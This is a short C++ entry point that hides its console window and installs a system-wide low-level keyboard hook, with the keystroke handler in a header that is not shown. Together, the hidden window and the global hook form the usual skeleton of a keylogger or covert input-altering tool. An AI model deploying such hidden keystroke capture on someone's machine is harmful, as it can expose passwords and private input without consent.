#include "headers/uwu_keyboard_hook.h"


/**
 * > The function `keyBoardProc` is called whenever a key is pressed.
 */
int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    uwu_keyboard_hook::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                                                       uwu_keyboard_hook::keyBoardProc,
                                                       nullptr,
                                                       NULL
                                             );
    MSG msg{nullptr};
    while (GetMessage(&msg, nullptr, 0, 0) != 0);
    UnhookWindowsHookEx(uwu_keyboard_hook::keyboardHook);
}